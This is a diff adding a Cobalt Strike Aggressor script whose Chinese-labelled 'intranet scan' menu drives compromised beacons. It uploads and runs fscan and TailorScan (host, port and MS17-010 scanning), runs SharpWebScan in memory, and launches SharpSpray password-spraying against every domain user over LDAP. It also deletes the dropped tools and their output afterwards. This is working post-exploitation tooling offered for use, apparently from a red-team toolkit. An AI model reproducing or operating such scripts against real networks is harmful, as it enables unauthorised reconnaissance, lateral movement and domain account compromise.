@@ -1,0 +1,121 @@
+menu "内网扫描" {
+  menu "Fscan" {
+    item "上传fscan" {
+      $bid = $1;
+      $dialog = dialog("上传fscan", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &fscan);
+      dialog_description($dialog, "支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写私钥、计划任务反弹shell、读取win网卡信息等。项目地址：https://github.com/shadow1ng/fscan");
+      drow_text($dialog, "UploadPath",  "上传路径: ");
+      dbutton_action($dialog, "上传");
+      dialog_show($dialog);
+    }
+    sub fscan {
+      bcd($bid, $3['UploadPath']);
+      bupload($bid, script_resource("/scripts/IntrScan/fscan.exe"));
+    }
+    item "运行fscan"{
+      $bid = $1['@'];
+      $dialog = dialog("运行fscan",%(exec => "fscan.exe -h 192.168.1.1/24 -o out.txt", bid => $bid),&fscan_run);
+      dialog_description($dialog, "请在下方输入运行指令：");
+      drow_text($dialog, "exec", "Exec: ");
+      dbutton_action($dialog, "运行");
+      dialog_show($dialog);
+    }
+    sub fscan_run{
+      $exec = $3['exec'];
+      bshell($bid, "$exec");
+    }
+    item "删除fscan"{
+      $bid = $1['@'];
+      bshell($bid, "taskkill -f /im fscan.exe & del /f /s /q fscan.exe & del /f /s /q out.txt");
+    }
+  }
+  item "SharpWebScan (探测web服务)" {
+    $bid = $1['@'];
+    $dialog = dialog("SharpWebScan", %(iptype => "-IP",ip => beacon_info($bid,"internal"),port => "80,443,7001,8000,8001,8080,8888",bid => $bid), &SharpWebScan);
+    dialog_description($dialog, "扫描IP或C段的Web服务，获取Title，可自定义多端口扫描，返回web地址和title。项目地址：https://github.com/RcoIl/CSharp-Tools/tree/master/SharpWebScan");
+    drow_text($dialog, "ip", "ip:  ");
+    drow_text($dialog, "port", "ports:  ");
+    drow_combobox($dialog, "iptype", "-ip/-cip", @("-IP", "-CIP"));
+    dbutton_action($dialog, "运行");
+    dialog_show($dialog);
+  }
+  sub SharpWebScan {
+    $arg = join(' ', @($3['iptype'],$3['ip'],$3['port']));
+    bexecute_assembly($bid, script_resource("/scripts/IntrScan/SharpWebScan.exe"), $arg);
+  }
+
+  menu "TailorScan (缝合怪内网扫描器)" {
+    item "上传TailorScan" {
+      $bid = $1;
+      $dialog = dialog("上传TailorScan", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &TailorScan);
+      dialog_description($dialog, "支持端口扫描，识别服务，获取title，扫描多网卡，ms17010扫描，icmp存活探测。项目地址：https://github.com/uknowsec/TailorScan");
+      drow_text($dialog, "UploadPath",  "上传路径: ");
+      dbutton_action($dialog, "上传");
+      dialog_show($dialog);
+    }
+    sub TailorScan {
+      bcd($bid, $3['UploadPath']);
+      bupload($bid, script_resource("/scripts/IntrScan/TailorScan.exe"));
+    }
+    item "运行TailorScan"{
+			$bid = $1['@'];
+      btask($bid, " ", "");
+      btask($bid, "TailorScan.exe", "");
+      btask($bid, " ", "");
+      btask($bid, "扫描IP格式支持：", "");
+      btask($bid, "   192.168.1.1", "");
+      btask($bid, "   192.168.1.1-10", "");
+      btask($bid, "   192.168.1.*", "");
+      btask($bid, "   192.168.1.0/24", "");
+      btask($bid, " ", "");
+      btask($bid, "端口支持自定义列表，用','分隔，如：", "");
+      btask($bid, "   21,22,80-99,8000-8080", "");
+      btask($bid, " ", "");
+      btask($bid, "端口扫描，支持tcp、icmp:", "");
+      btask($bid, "   TailorScan.exe portscan 192.168.0.1/24 80,8080 tcp", "");
+      btask($bid, "   TailorScan.exe portscan 192.168.0.1/24 tcp", "");
+      btask($bid, " ", "");
+      btask($bid, "永恒之蓝探测：", "");
+      btask($bid, "   TailorScan.exe ms17010 -i 192.168.0.1", "");
+      btask($bid, "   TailorScan.exe ms17010 -n 192.168.0.1/24", "");
+      btask($bid, " ", "");
+      btask($bid, "OXID Find：", "");
+      btask($bid, "   TailorScan.exe oxidfind -i 192.168.0.1", "");
+      btask($bid, "   TailorScan.exe oxidfind -n 192.168.0.1/24", "");
+      btask($bid, " ", "");
+      btask($bid, "ICMP check：", "");
+      btask($bid, "   TailorScan.exe icmpcheck 192.168.0.1/24", "");
+      btask($bid, " ", "");
+			$dialog = dialog("运行TailorScan",%(exec => "TailorScan.exe ms17010 -n 192.168.0.1/24", bid => $bid),&TailorScan_run);
+			dialog_description($dialog, "注意控制台输出的使用说明，直接在下方输入执行指令：");
+      drow_text($dialog, "exec", "Exec: ");
+			dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+		}
+		sub TailorScan_run{
+      $exec = $3['exec'];
+			bshell($bid, "$exec");
+		}
+    item "删除TailorScan"{
+			$bid = $1['@'];
+      bshell($bid, "taskkill -f /im TailorScan.exe & del /f /s /q TailorScan.exe");
+    }
+  }
+
+  item "SharpSpray (域内密码爆破)" {
+    $bid = $1['@'];
+    $dialog = dialog("SharpSpray", %(passwd => "123,888",Delay => "1000",Sleep => "1",bid => $bid), &SharpSpray);
+    dialog_description($dialog, "使用LDAP对域的所有用户执行密码喷雾攻击。seeds：指定几个密码生成字典，逗号分隔。passwords：指定密码爆破，可多个密码，逗号分隔。delay：密码喷雾的延迟，毫秒为单位。sleep：密码猜测之间sleep周期分钟数。项目地址：https://github.com/jnqpblc/SharpSpray");
+    drow_combobox($dialog, "type", "type:", @("--Seeds","--Passwords"));
+    drow_text($dialog, "passwd", "passwd:  ");
+    drow_text($dialog, "Delay", "Delay:  ");
+    drow_text($dialog, "Sleep", "Sleep:  ");
+    dbutton_action($dialog, "运行");
+    dialog_show($dialog);
+  }
+  sub SharpSpray {
+    $arg = join(' ',  @($3['type'],$3['passwd'],"--Sleep",$3['Sleep'],"--Delay",$3['Delay']));
+    bexecute_assembly($bid, script_resource("/scripts/IntrScan/SharpSpray.exe"), $arg);
+  }
+
+}
